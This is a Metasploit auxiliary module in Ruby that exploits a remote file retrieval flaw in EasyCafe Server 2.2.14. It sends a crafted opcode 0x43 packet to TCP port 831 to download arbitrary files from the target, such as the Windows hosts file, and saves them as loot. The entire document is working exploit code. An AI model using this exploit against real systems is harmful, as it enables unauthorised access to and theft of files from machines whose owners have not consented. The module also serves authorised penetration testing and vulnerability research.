##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit4 < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'EasyCafe Server Remote File Access',
      'Description' => %q{
          This module exploits a file retrieval vulnerability in
        EasyCafe Server. The vulnerability can be triggered by
        sending a specially crafted packet (opcode 0x43) to the
        831/TCP port.
        This module has been successfully tested on EasyCafe Server
        version 2.2.14 (Trial mode and Demo mode) on Windows XP SP3
        and Windows 7 SP1.
        Note that the server will throw a popup messagebox if the
        specified file does not exist.
      },
      'License'     => MSF_LICENSE,
      'Author'      =>
        [
          'R-73eN', # Vulnerability Discovery
          'Brendan Coles <bcoles[at]gmail.com>' # Metasploit module
        ],
      'References'  =>
        [
          [ 'EDB', '39102' ]
        ]
    ))

    register_options(
      [
        Opt::RPORT(831),
        OptString.new('FILEPATH', [true, 'The path of the file to download', 'C:\\WINDOWS\\system32\\drivers\\etc\\hosts'])
      ], self.class)
  end

  def run_host(ip)
    if datastore['FILEPATH'].nil? || datastore['FILEPATH'].empty?
      print_error('Please supply the name of the file you want to download')
      return
    end

    file_path = datastore['FILEPATH']
    packet = "\x43"
    packet << file_path
    packet << "\x00" * (255 - file_path.length)
    packet << "\x01\x00\x00\x00\x01"

    vprint_status("#{peer} - Sending request (#{packet.length} bytes)")
    connect
    sock.put(packet)
    res = sock.get(15)
    disconnect
    unless res
      print_error("#{peer} - Unable to retrieve file due to a timeout.")
      return
    end
    vprint_status("#{peer} - Received response (#{res.length} bytes)")

    # Extract file contents
    # Content begins after \x00\x01
    contents = res.sub(/\A.*?\x00\x01/m, '').to_s
    if contents.nil? || contents.empty?
      print_error("#{peer} - Unexpected reply. Unable to extract contents")
      return
    end
    print_status("#{peer} - File retrieved successfully (#{contents.length} bytes)!")
    path = store_loot(
      'easycafe_server',
      'application/octet-stream',
      ip,
      contents,
      File.basename(file_path)
    )
    print_status("File saved in: #{path}")
  end
end
